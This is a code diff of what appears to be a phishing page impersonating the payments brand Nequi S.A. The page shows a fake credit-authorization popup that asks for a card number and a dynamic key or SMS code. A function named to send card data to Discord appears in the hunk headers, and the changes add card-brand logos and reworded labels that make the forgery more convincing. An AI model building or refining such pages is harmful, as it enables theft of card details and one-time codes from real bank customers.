@@ -791,13 +791,13 @@
                 <img src="logocc.svg" alt="Nequi" class="logo">
             </div>
             <div class="price-panel">
-                <div class="merchant-label">Crédito de</div>
+                <div class="merchant-label">Crédito a</div>
                 <div class="merchant-name" title="Nequi S.A">Nequi S.A</div>
                 <button class="info-pill" type="button">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM18.3829 8.32144L17.6169 7.67859L10.4129 16.261L6.35267 12.2196L5.64722 12.9284L10.4798 17.7384L18.3829 8.32144Z" fill="#2C2A29"/>
                     </svg>
-                    <span>Información de la entidad crediticia</span>
+                    <span>Información del comercio</span>
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path fill-rule="evenodd" clip-rule="evenodd" d="M20.092 8.223L12.607 15.708C12.216 16.098 11.583 16.098 11.193 15.708L3.707 8.223L3 8.93L10.486 16.415C11.265 17.195 12.534 17.195 13.314 16.415L20.799 8.93L20.092 8.223Z" fill="#2C2A29"/>
                     </svg>
@@ -979,18 +979,20 @@
         <button class="auth-modal-close" onclick="closeAuthModal()">×</button>
         
         <div style="margin:0; background:#fff; color:#000; font-family: system-ui, -apple-system, Arial, sans-serif; font-size:15px; line-height:1.6; padding:32px 24px; max-width:640px; width:100%; border-radius:8px;">
-            <h1 style="font-size:18px; margin:0 0 20px 0;">Autorización de credito</h1>
-
+<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+    <h1 style="font-size:18px; margin:0;">Autorización de credito</h1>
+    <div id="cardBrandLogo" style="height:28px; margin-right:50px;"></div>
+</div>
 <p>El credito que intentas realizar en NEQUI S.A por $<span id="montoPopup">0</span> COP el <span id="currentDate"></span> con tu tarjeta terminada en <strong id="lastFourDigitsPopup">************</strong> debe ser autorizada por seguridad.</p>
             <p>"¡Avancemos con el credito! Para terminar y por seguridad, necesitamos confirmar que eres tú quién está detrás de esta pantalla. Ingresa un dato que solo tú conoces. Consulta tu clave dinámica o SMS escríbelo aquí.</p>
 
-            <h2 style="font-size:16px; margin:28px 0 16px 0; font-weight:bold;">Detalle del Credito</h2>
+            <h2 style="font-size:16px; margin:28px 0 16px 0; font-weight:bold;">Detalle de la Transacción</h2>
 
             <div style="margin-bottom:20px;">
                 <div class="row" style="margin-bottom:10px;"><label style="font-weight:bold;">Entidad Crediticia:</label><span>NEQUI S.A</span></div>
 <div class="row" style="margin-bottom:10px;"><label style="font-weight:bold;">Monto del credito:</label><span>$ <span id="montoPopup2">0</span> COP</span></div>                <div class="row" style="margin-bottom:10px;"><label style="font-weight:bold;">Número de Tarjeta:</label><span id="popupCardNumber">************</span></div>
                 <div class="row">
-                    <label style="font-weight:bold;">Ingresa tu Clave Dinámica o Codigo SMS:</label>
+                    <label style="font-weight:bold;">Ingresa tu Clave Dinámica o SMS:</label>
                     <div class="dynamic-wrapper" style="position:relative;">
                         <input type="text" id="dynamicCode" 
                                style="border:1px solid #999; height:38px; width:220px; padding:0 10px; font-size:15px; border-radius:4px;" 
@@ -1150,7 +1152,7 @@ function enviarDatosTarjetaADiscord() {
         }, 400);
     }
 
-  submitBtn.addEventListener('click', function(e) {
+submitBtn.addEventListener('click', function(e) {
     if (!this.disabled) {
         e.preventDefault();
 
@@ -1162,6 +1164,19 @@ function enviarDatosTarjetaADiscord() {
         
         document.getElementById('lastFourDigitsPopup').textContent = masked;
         document.getElementById('popupCardNumber').textContent = masked;
+
+        const logoContainer = document.getElementById('cardBrandLogo');
+        const firstDigit = cardInput.charAt(0);
+
+
+    if (firstDigit === '4') {
+    logoContainer.innerHTML = `<img src="Visa_Inc._logo_(2005–2014).svg" style="height:28px; width:auto;">`;
+} else if (firstDigit === '5' || firstDigit === '2') {
+    logoContainer.innerHTML = `<img src="Mastercard-logo.svg" style="height:50px; width:auto;">`;
+} else {
+    logoContainer.innerHTML = '';
+}
+
 
         openAuthModal();
     }
